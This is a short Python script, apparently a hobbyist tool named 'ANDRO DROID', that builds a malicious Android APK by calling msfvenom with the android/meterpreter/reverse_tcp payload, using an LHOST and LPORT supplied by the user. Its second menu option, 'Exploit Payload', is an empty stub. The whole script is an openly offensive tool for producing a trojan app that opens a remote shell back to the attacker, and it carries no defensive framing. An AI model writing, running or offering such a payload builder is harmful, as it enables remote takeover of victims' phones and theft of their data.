import pyfiglet
import os
import socket

ascii_banner = pyfiglet.figlet_format("ANDRO DROID")
print(ascii_banner)
def create_payload(b, e):
    print(b)
    print(e)
    home_path = os.path.expanduser('~')
    directory = "Android_Shell_Apk"
    path = os.path.join(home_path, directory)
    dir_check = os.path.isdir(path)
    if dir_check != True:
        os.mkdir(path)
    create_payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + b + " LPORT="+ str(e) +" R > "+ path +"/my_shell.apk"
    payload = os.popen(create_payload)
    print(payload.read())
    print("Payload Created")

def exploit():
    print("We are working on it")

print("1. Create Payload \n2. Exploit Payload")
a = int(input("Choose the Option: "))
if a == 1:
    print("1. Choose automatically \n2. I given IP Adrress")
    x = int(input("Choose the Option: "))
    if x == 1:
        c = os.popen('hostname -I | cut -d " " -f 1 | tr -d "\n"')
        d = c.read()
        e = int(input("Please enter LPORT number: "))
        create_payload(d, e)
    if x == 2:
        b = input("Please Enter your LHOST: ")
        e = int(input("Please enter LPORT number: "))
        create_payload(b, e)

if a == 2:
    exploit()
